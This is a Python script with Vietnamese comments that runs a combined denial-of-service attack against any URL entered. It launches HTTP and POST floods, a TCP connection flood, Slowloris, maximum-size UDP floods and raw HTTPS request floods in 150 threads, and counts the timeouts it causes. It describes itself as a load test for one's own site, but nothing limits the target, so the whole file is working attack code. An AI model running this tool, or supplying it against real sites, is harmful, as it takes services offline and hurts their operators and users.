import requests
import threading
import time
import socket
import random
import sys

# ===== BIẾN TOÀN CỤC =====
success_count = 0
error_count = 0
timeout_count = 0
lock = threading.Lock()

# ===== 1. HTTP FLOOD =====
def http_flood(web_url):
    """Gửi request HTTP liên tục đến web của bạn"""
    global success_count, error_count, timeout_count
    
    headers = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
        {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)"},
        {"User-Agent": "Mozilla/5.0 (Linux; Android 11)"},
    ]
    
    paths = [
        "/",
        "/api",
        "/products",
        "/search?q=test",
        "/login",
        "/register",
        "/about",
        "/contact",
        "/services",
        "/blog",
    ]
    
    while True:
        try:
            path = random.choice(paths)
            url = web_url + path
            
            # GET request với timeout 0.5s
            r = requests.get(url, headers=random.choice(headers), timeout=0.5)
            
            with lock:
                success_count += 1
                print(f"✅ {r.status_code} - {path}", end=" ", flush=True)
            
            # POST request với data lớn
            try:
                r = requests.post(web_url + "/api", 
                                data={"data": "x" * 10000}, 
                                timeout=0.5)
                with lock:
                    success_count += 1
                    print(f"✅ POST {r.status_code}", end=" ", flush=True)
            except:
                pass
                
        except requests.exceptions.Timeout:
            with lock:
                timeout_count += 1
                print(f"⏰ TIMEOUT", end=" ", flush=True)
        except:
            with lock:
                error_count += 1
                print(f"❌ ERROR", end=" ", flush=True)

# ===== 2. TCP CONNECTION FLOOD =====
def tcp_flood(web_url):
    """Tạo kết nối TCP đến web của bạn"""
    host = web_url.replace("https://", "").replace("http://", "").split("/")[0]
    port = 443 if web_url.startswith("https") else 80
    
    sockets = []
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((host, port))
            s.send(b"X" * 10240)
            sockets.append(s)
            
            if len(sockets) > 2000:
                for _ in range(100):
                    try:
                        old = sockets.pop(0)
                        old.close()
                    except:
                        pass
        except:
            pass

# ===== 3. SLOWLORIS =====
def slowloris(web_url):
    """Giữ kết nối HTTP treo, làm web timeout"""
    host = web_url.replace("https://", "").replace("http://", "").split("/")[0]
    port = 443 if web_url.startswith("https") else 80
    
    sockets = []
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            
            # Gửi request CHƯA HOÀN CHỈNH
            s.send(f"GET / HTTP/1.1\r\n".encode())
            s.send(f"Host: {host}\r\n".encode())
            s.send(f"User-Agent: Mozilla/5.0\r\n".encode())
            
            # Gửi header từng phần, rất chậm
            for i in range(10):
                s.send(f"X-Header-{i}: {random.randint(1,9999)}\r\n".encode())
                time.sleep(0.5)
            
            sockets.append(s)
            
            if len(sockets) > 500:
                for _ in range(50):
                    try:
                        old = sockets.pop(0)
                        old.close()
                    except:
                        pass
        except:
            pass

# ===== 4. UDP FLOOD =====
def udp_flood(web_url):
    """Gửi UDP gói tin đến web của bạn"""
    host = web_url.replace("https://", "").replace("http://", "").split("/")[0]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 65507
    
    try:
        ip = socket.gethostbyname(host)
    except:
        ip = host
    
    while True:
        try:
            for port in [80, 443, 8080, 53]:
                sock.sendto(payload, (ip, port))
        except:
            pass

# ===== 5. HTTPS FLOOD =====
def https_flood(web_url):
    """Gửi request HTTPS nếu web dùng SSL"""
    host = web_url.replace("https://", "").replace("http://", "").split("/")[0]
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((host, 443))
            s.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n" * 100)
            s.close()
        except:
            pass

# ===== THEO DÕI =====
def monitor():
    """Hiển thị thống kê"""
    global success_count, error_count, timeout_count
    
    while True:
        with lock:
            total = success_count + error_count + timeout_count
            success_rate = (success_count / total * 100) if total > 0 else 0
            
            print("\n" + "=" * 60)
            print("📊 THỐNG KÊ:")
            print(f"  ✅ Thành công: {success_count}")
            print(f"  ❌ Lỗi: {error_count}")
            print(f"  ⏰ Timeout: {timeout_count}")
            print(f"  📈 Tỷ lệ thành công: {success_rate:.1f}%")
            print(f"  📡 Tổng request: {total}")
            print(f"  🧵 Số thread: {threading.active_count()}")
            print("=" * 60)
        
        time.sleep(3)

# ===== ===== ===== ===== =====
# ==== MAIN =====
# ===== ===== ===== ===== =====

def main():
    global success_count, error_count, timeout_count
    
    # Reset counters
    success_count = 0
    error_count = 0
    timeout_count = 0
    
    print("=" * 75)
    print("🔥🔥🔥 TEST WEB - GÂY TIMEOUT")
    print("=" * 75)
    
    # Nhập URL
    print("\n📌 NHẬP THÔNG TIN WEB CỦA BẠN:")
    web_url = input("🌐 URL web (VD: https://example.com hoặc http://localhost:8080): ")
    
    if not web_url.strip():
        web_url = "http://localhost:8080"
        print(f"⚠️ Sử dụng mặc định: {web_url}")
    
    # Nhập thời gian
    time_input = input("⏱️ Thời gian test (giây, mặc định 60): ")
    if time_input.strip():
        try:
            thoi_gian = int(time_input.strip())
        except:
            thoi_gian = 60
    else:
        thoi_gian = 60
    
    # Nhập số luồng
    thread_input = input("🧵 Số luồng tấn công (mặc định 100): ")
    if thread_input.strip():
        try:
            so_luong = int(thread_input.strip())
        except:
            so_luong = 100
    else:
        so_luong = 100
    
    print("\n" + "=" * 75)
    print(f"🌐 Web: {web_url}")
    print(f"⏱️ Thời gian: {thoi_gian} giây")
    print(f"🧵 Số luồng: {so_luong}")
    print("=" * 75)
    print("⚔️ Phương thức tấn công:")
    print("  📥 HTTP Flood     - 50 luồng")
    print("  🔗 TCP Flood      - 30 luồng")
    print("  🐌 Slowloris      - 30 luồng")
    print("  📤 UDP Flood      - 20 luồng")
    print("  🔒 HTTPS Flood    - 20 luồng")
    print("=" * 75)
    print("⚠️ LƯU Ý: CHỈ DÙNG CHO WEB CỦA BẠN!")
    print("=" * 75)
    
    confirm = input("\nNhập 'yes' để bắt đầu test: ")
    if confirm.lower() != 'yes':
        print("Đã hủy.")
        return
    
    print("\n🚀 KHỞI ĐỘNG TẤN CÔNG...")
    
    # Khởi tạo threads
    threads = []
    
    # 1. HTTP Flood - 50 luồng
    print("📡 50 luồng HTTP Flood...")
    for i in range(50):
        t = threading.Thread(target=http_flood, args=(web_url,), daemon=True)
        t.start()
        threads.append(t)
    
    # 2. TCP Flood - 30 luồng
    print("📡 30 luồng TCP Flood...")
    for i in range(30):
        t = threading.Thread(target=tcp_flood, args=(web_url,), daemon=True)
        t.start()
        threads.append(t)
    
    # 3. Slowloris - 30 luồng
    print("📡 30 luồng Slowloris...")
    for i in range(30):
        t = threading.Thread(target=slowloris, args=(web_url,), daemon=True)
        t.start()
        threads.append(t)
    
    # 4. UDP Flood - 20 luồng
    print("📡 20 luồng UDP Flood...")
    for i in range(20):
        t = threading.Thread(target=udp_flood, args=(web_url,), daemon=True)
        t.start()
        threads.append(t)
    
    # 5. HTTPS Flood - 20 luồng
    print("📡 20 luồng HTTPS Flood...")
    for i in range(20):
        t = threading.Thread(target=https_flood, args=(web_url,), daemon=True)
        t.start()
        threads.append(t)
    
    # Monitor - chạy riêng
    threading.Thread(target=monitor, daemon=True).start()
    
    print("\n" + "=" * 75)
    print("🔥🔥🔥 ĐANG TEST WEB - CHỜ TIMEOUT")
    print("📊 Theo dõi thống kê bên dưới...")
    print("=" * 75)
    
    # Đếm ngược
    for i in range(thoi_gian, 0, -1):
        print(f"\r⏱️ Còn {i:2d} giây...", end="", flush=True)
        time.sleep(1)
    
    print("\n\n" + "=" * 75)
    print("✅ KẾT THÚC TEST!")
    print("📊 KẾT QUẢ KIỂM TRA:")
    
    total = success_count + error_count + timeout_count
    
    if total > 0:
        timeout_rate = (timeout_count / total * 100)
        error_rate = (error_count / total * 100)
        success_rate = (success_count / total * 100)
        
        print(f"  ✅ Thành công: {success_count}  ({success_rate:.1f}%)")
        print(f"  ❌ Lỗi: {error_count}  ({error_rate:.1f}%)")
        print(f"  ⏰ Timeout: {timeout_count}  ({timeout_rate:.1f}%)")
        print(f"  📡 Tổng request: {total}")
        print("=" * 75)
        
        if timeout_rate > 50:
            print("🔴 KẾT LUẬN: Web của bạn BỊ TIMEOUT!")
            print("   💡 Cần tối ưu code, cache, database")
            print("   💡 Nâng cấp server hoặc dùng CDN")
        elif error_rate > 30:
            print("🟡 KẾT LUẬN: Web có NHIỀU LỖI!")
            print("   💡 Kiểm tra log server để fix bug")
        else:
            print("🟢 KẾT LUẬN: Web của bạn ỔN ĐỊNH!")
            print("   💡 Vẫn chịu được tải tốt")
    else:
        print("❌ KHÔNG CÓ REQUEST NÀO ĐƯỢC GỬI!")
        print("   💡 Kiểm tra URL web của bạn")
        print("   💡 Kiểm tra kết nối mạng")
    
    print("=" * 75)
    
    input("\nNhấn Enter để thoát...")

if __name__ == "__main__":
    try:
        import requests
    except ImportError:
        print("⚠️ Đang cài đặt requests...")
        import os
        os.system("pip install requests")
        import requests
    
    main()